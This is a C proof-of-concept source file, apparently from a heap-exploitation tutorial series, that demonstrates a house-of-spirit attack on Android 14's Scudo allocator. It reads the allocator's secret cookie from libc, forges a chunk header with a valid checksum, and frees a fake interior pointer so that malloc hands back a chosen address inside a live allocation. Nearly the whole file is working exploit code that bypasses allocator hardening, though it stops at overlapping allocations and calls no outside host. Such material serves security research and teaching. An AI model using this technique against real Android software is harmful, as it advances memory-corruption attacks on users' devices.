#define _GNU_SOURCE

#include "target.h"

#include <android/log.h>

#include <link.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
 * House-of-spirit demonstration for Android 14 AArch64 libc build ID
 * 1d36f8ae6e0af6158793abea7d4f4f2b.
 *
 * Starting primitives modeled by this demonstration:
 *   - disclosure of the Scudo cookie and libc base;
 *   - control of aligned primary-region memory for a fake chunk header; and
 *   - the ability to pass the corresponding fake user pointer to free().
 *
 * Result demonstrated:
 *   - malloc(0x10) returns an address inside a still-live backing allocation,
 *     creating overlapping allocations.
 *
 */

enum {
    kClassIdShift = 0,
    kStateShift = 8,
    kOriginShift = 10,
    kSizeOrUnusedBytesShift = 12,
    kOffsetShift = 32,
    kChecksumShift = 48,
};

static const char kLogTag[] = "HOW2SCUDO_HOS";
static uintptr_t g_libc_base;

_Static_assert(sizeof(uintptr_t) == 8, "this PoC requires a 64-bit ABI");
_Static_assert(HOW2SCUDO_TARGET_COMBINED_HEADER_SIZE == 0x10U,
               "unexpected combined-header size");
_Static_assert(HOW2SCUDO_TARGET_SMALLEST_PRIMARY_CLASS_ID < 0x100U,
               "class ID does not fit the packed header");

__attribute__((format(printf, 3, 4))) static void
log_message(int priority, FILE *stream, const char *format, ...) {
    va_list arguments;
    va_start(arguments, format);

    va_list android_arguments;
    va_copy(android_arguments, arguments);
    __android_log_vprint(priority, kLogTag, format, android_arguments);
    va_end(android_arguments);

    fprintf(stream, "[%s] ", kLogTag);
    vfprintf(stream, format, arguments);
    fputc('\n', stream);
    fflush(stream);
    va_end(arguments);
}

#define LOGI(...) log_message(ANDROID_LOG_INFO, stdout, __VA_ARGS__)
#define LOGE(...) log_message(ANDROID_LOG_ERROR, stderr, __VA_ARGS__)

static uintptr_t untag(uintptr_t value) {
    return value & HOW2SCUDO_TARGET_ADDRESS_MASK;
}

static int find_libc(struct dl_phdr_info *info, size_t size, void *data) {
    (void)size;
    (void)data;

    if (info->dlpi_name != NULL &&
        strstr(info->dlpi_name, "/libc.so") != NULL) {
        g_libc_base = (uintptr_t)info->dlpi_addr;
        return 1;
    }
    return 0;
}

static bool locate_libc(void) {
    g_libc_base = 0;
    dl_iterate_phdr(find_libc, NULL);
    return g_libc_base != 0;
}

static uint32_t leak_scudo_cookie(void) {
    uintptr_t address = g_libc_base + HOW2SCUDO_TARGET_SCUDO_ALLOCATOR_OFFSET;
    return *(volatile uint32_t *)address;
}

/* Software CRC32C equivalent of the target's AArch64 crc32cx sequence. */
static uint32_t crc32_u64(uint32_t crc, uint64_t value) {
    crc ^= (uint32_t)value;
    for (int bit = 0; bit < 32; ++bit) {
        crc = (crc >> 1) ^ (0x82f63b78U & -(int32_t)(crc & UINT32_C(1)));
    }

    crc ^= (uint32_t)(value >> 32);
    for (int bit = 0; bit < 32; ++bit) {
        crc = (crc >> 1) ^ (0x82f63b78U & -(int32_t)(crc & UINT32_C(1)));
    }
    return crc;
}

static uint16_t scudo_header_checksum(uintptr_t user_pointer,
                                      uint64_t packed_header, uint32_t cookie) {
    uint32_t crc = crc32_u64(cookie, user_pointer);
    crc = crc32_u64(crc, packed_header & UINT64_C(0x0000ffffffffffff));
    return (uint16_t)(crc ^ (crc >> 16));
}

static uintptr_t header_pointer_for_checksum(const void *pointer) {
    return untag((uintptr_t)pointer) | HOW2SCUDO_TARGET_SCUDO_HEADER_TAG;
}

static uint64_t build_allocated_header(unsigned class_id, uint16_t checksum) {
    uint64_t header = 0;
    header |= (uint64_t)class_id << kClassIdShift;
    header |= UINT64_C(1) << kStateShift;
    header |= UINT64_C(0) << kOriginShift;
    header |= UINT64_C(0) << kSizeOrUnusedBytesShift;
    header |= UINT64_C(0) << kOffsetShift;
    header |= (uint64_t)checksum << kChecksumShift;
    return header;
}

static uint64_t read_header_before(const void *user_pointer) {
    uint64_t header = 0;
    uintptr_t header_address =
        untag((uintptr_t)user_pointer) - HOW2SCUDO_TARGET_COMBINED_HEADER_SIZE;
    memcpy(&header, (const void *)header_address, sizeof(header));
    return header;
}

int how2scudo_run(void) {
    LOGI("=== house of spirit tutorial ===");
    LOGI("Goal: forge a valid class-1 chunk inside a live primary allocation, "
         "free it into Scudo's local cache, and create an overlap.");
    LOGI(
        "Starting primitives: libc-base/cookie disclosure, writable aligned "
        "primary-region memory, and a controlled free of its interior pointer.");
    LOGI("Success condition: malloc(0x%x) returns the chosen fake user address "
         "and a marker can be written through the returned pointer.",
         HOW2SCUDO_TARGET_SMALLEST_PRIMARY_REQUEST_SIZE);
    LOGI("Target guard: Android API %u, ABI %s, exact libc build ID %s.",
         HOW2SCUDO_TARGET_ANDROID_API, HOW2SCUDO_TARGET_ABI,
         HOW2SCUDO_TARGET_LIBC_BUILD_ID);

    LOGI("[1/6] Locate the loaded libc and disclose its Scudo cookie.");
    if (!locate_libc()) {
        LOGE("[1/6] Failed: could not locate libc.so in the process mappings.");
        return 1;
    }

    uint32_t cookie = leak_scudo_cookie();
    LOGI("[1/6] libc base: 0x%zx", (size_t)g_libc_base);
    LOGI("[1/6] cookie at libc + 0x%zx: 0x%08x",
         (size_t)HOW2SCUDO_TARGET_SCUDO_ALLOCATOR_OFFSET, cookie);

    LOGI("[2/6] Measure the real class selected by malloc(0x%x).",
         HOW2SCUDO_TARGET_SMALLEST_PRIMARY_REQUEST_SIZE);
    LOGI("The 0x10-byte request plus Scudo's 0x10-byte header needs a "
         "0x20-byte block, which should select AndroidSizeClassMap class 1.");
    void *probe = malloc(HOW2SCUDO_TARGET_SMALLEST_PRIMARY_REQUEST_SIZE);
    if (probe == NULL) {
        LOGE("[2/6] Failed: the class-probe allocation returned null.");
        return 2;
    }

    uint64_t probe_header = read_header_before(probe);
    unsigned observed_class_id =
        (unsigned)((probe_header >> kClassIdShift) & UINT64_C(0xff));
    unsigned observed_state =
        (unsigned)((probe_header >> kStateShift) & UINT64_C(0x3));
    LOGI("[2/6] probe pointer: %p; packed header: 0x%016llx", probe,
         (unsigned long long)probe_header);
    LOGI("[2/6] observed ClassId=%u, State=%u", observed_class_id,
         observed_state);

    if (observed_class_id != HOW2SCUDO_TARGET_SMALLEST_PRIMARY_CLASS_ID ||
        observed_state != 1U) {
        LOGE("[2/6] Failed: the runtime size class or state does not match "
             "this build-specific PoC.");
        free(probe);
        return 3;
    }
    LOGI("[3/6] Allocate controlled storage in Scudo's primary region.");
    LOGI("This build stores primary compact pointers in 32 bits at scale 16. "
         "Compression is unsigned relative to the class-1 region base, so "
         "the chosen address must be above that base and within 64 GiB.");
    static const size_t backing_sizes[] = {
        0x20U,  0x30U,  0x40U,  0x50U,   0x60U,
        0x80U,  0x100U, 0x200U, 0x400U,  0x800U,
        0x1000U, 0x2000U, 0x4000U, 0x8000U,
    };
    unsigned char *backing = NULL;
    size_t backing_size = 0;
    uintptr_t class_one_example = untag((uintptr_t)probe);
    for (size_t index = 0;
         index < sizeof(backing_sizes) / sizeof(backing_sizes[0]); ++index) {
        unsigned char *candidate =
            (unsigned char *)malloc(backing_sizes[index]);
        if (candidate == NULL) {
            continue;
        }
        uintptr_t candidate_address = untag((uintptr_t)candidate);
        unsigned candidate_class = (unsigned)(
            (read_header_before(candidate) >> kClassIdShift) & UINT64_C(0xff));
        LOGI("[3/6] candidate malloc(0x%zx): %p (ClassId=%u)",
             backing_sizes[index], (void *)candidate, candidate_class);
        if (candidate_class != 0U &&
            candidate_class != HOW2SCUDO_TARGET_SMALLEST_PRIMARY_CLASS_ID &&
            candidate_address > class_one_example &&
            candidate_address - class_one_example <=
                (UINT64_C(0xffffffff) <<
                 HOW2SCUDO_TARGET_PRIMARY_COMPACT_PTR_SCALE_LOG)) {
            backing = candidate;
            backing_size = backing_sizes[index];
            break;
        }
    }
    if (backing == NULL) {
        LOGE("[3/6] Retry condition: no tested primary class produced a "
             "representable address above the observed class-1 allocation.");
        return 4;
    }
    void *fake_header = backing;
    void *fake_user = backing + HOW2SCUDO_TARGET_COMBINED_HEADER_SIZE;
    memset(backing, 0, backing_size);
    LOGI("[3/6] selected live backing allocation: %p (request 0x%zx)",
         (void *)backing, backing_size);
    LOGI("[3/6] fake combined-header area: %p", fake_header);
    LOGI("[3/6] chosen fake user address:  %p", fake_user);
    LOGI("The user address is 16-byte aligned and follows the fake header by "
         "0x%x bytes.",
         HOW2SCUDO_TARGET_COMBINED_HEADER_SIZE);

    if ((untag((uintptr_t)fake_user) & UINT64_C(0xf)) != 0) {
        LOGE("[3/6] Failed: the chosen fake user address is not aligned.");
        return 4;
    }

    LOGI("[4/6] Forge an allocated class-1 header with a valid checksum.");
    uint64_t packed_without_checksum =
        build_allocated_header(HOW2SCUDO_TARGET_SMALLEST_PRIMARY_CLASS_ID, 0);
    uintptr_t checksum_pointer = header_pointer_for_checksum(fake_user);
    uint16_t checksum = scudo_header_checksum(checksum_pointer,
                                              packed_without_checksum, cookie);
    uint64_t forged_header = build_allocated_header(
        HOW2SCUDO_TARGET_SMALLEST_PRIMARY_CLASS_ID, checksum);
    memcpy(fake_header, &forged_header, sizeof(forged_header));
    LOGI("[4/6] checksum input pointer: 0x%zx", (size_t)checksum_pointer);
    LOGI("[4/6] forged packed header: 0x%016llx",
         (unsigned long long)forged_header);
    LOGI("ClassId 1 selects the smallest primary class; State=Allocated and "
         "the cookie-derived checksum satisfy Scudo's immediate free checks.");

    LOGI("[5/6] Free the chosen interior pointer, then immediately allocate "
         "from the same class.");
    LOGI("Scudo compact-encodes the accepted block into the class-1 local "
         "cache. The chosen address must round-trip through that build's "
         "primary compact-pointer representation.");

    /*
     * Use volatile function pointers so the compiler does not replace or
     * diagnose the deliberate interior-pointer free as a normal free.
     * Keep malloc immediately after free: logging here could allocate and steal
     * the just-inserted cache entry.
     */
    void (*volatile invoke_free)(void *) = free;
    void *(*volatile invoke_malloc)(size_t) = malloc;
    invoke_free(fake_user);
    void *victim =
        invoke_malloc(HOW2SCUDO_TARGET_SMALLEST_PRIMARY_REQUEST_SIZE);

    LOGI("[5/6] free() returned without a Scudo abort.");
    LOGI("[5/6] malloc returned: %p", victim);

    if (victim == NULL) {
        LOGE("[5/6] Failed: malloc returned null.");
        return 5;
    }

    LOGI("[6/6] Compare the allocation with the chosen address.");
    LOGI("[6/6] returned allocation: %p", victim);
    LOGI("[6/6] chosen target:       %p", fake_user);
    if (untag((uintptr_t)victim) != untag((uintptr_t)fake_user)) {
        LOGE("[6/6] Failed: compact-pointer round-trip returned a different "
             "address.");
        return 6;
    }

    static const char marker[] = "spirit";
    memcpy(victim, marker, sizeof(marker));
    LOGI("[6/6] SUCCESS: fake user storage now contains '%s'.",
         (char *)fake_user);
    LOGI("Demonstrated primitive: malloc returned a chosen address inside a "
         "still-live allocation, producing overlapping allocations. This is "
         "not code execution.");

    /* Do not free victim or backing: their allocator ownership now overlaps. */
    return 0;
}

#ifdef HOW2SCUDO_STANDALONE
int main(void) { return how2scudo_run(); }
#endif
